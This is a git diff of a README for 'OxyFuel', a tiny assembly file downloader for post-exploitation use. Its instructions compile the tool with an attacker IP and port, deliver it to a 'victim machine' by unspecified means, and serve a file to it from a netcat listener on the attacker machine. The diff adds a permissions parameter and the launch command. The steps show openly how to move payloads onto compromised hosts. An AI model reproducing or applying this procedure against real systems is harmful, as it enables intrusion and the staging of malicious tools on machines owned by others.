@@ -1,5 +1,9 @@
 # OxyFuel downloader
 This repository contains a minimalistic file downloader written in x86 32b assembly, only using syscalls directly.
+The resulting binary file is about 8KB in size:
+```
+ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
+```
 
 Just like an oxy-acetylene torch, tools from `OxyFuel` suite shall be used as a last ditch effort when no other tool is present, or will __cut it__.
 
@@ -14,20 +18,23 @@ On attacker machine, you need to compile the downloader. You can specify paramet
 The parameters are:
 - `LHOST`: attacker IP
 - `LPORT`: attacker port
-- `RMODE`: (currently broken, TBD)
-- `RFILE`: path, where the transferred file will be written on target machine
+- `RMODE`: permissions of the transferred file on the target machine
+- `RFILE`: default path, where the transferred file is written
 
 After filling in the parameters follow the procedure:
 1. Fill in the values into `downloader.asm.tpl` and compile the downloader:
 ```shell
 make
 ```
-2. By some means, deliver the downloader to the victim machine (if `xz(1)` is present on the victim machine, see **Compression**)
+2. By some means, deliver the downloader to the victim machine (if `xz(1)` or other xz decompressor is present on the victim machine, see **Compression**)
 3. Start hosting the file you want delivered on your attacker machine using:
 ```shell
 cat file | nc -lvnp <LPORT> -q 2
 ```
 4. Launch the downloader on the victim machine
+```shell
+./downloader [RFILE]
+```
 5. The netcat will close the connection 2 seconds after the file is transmitted
 
 ## Compression
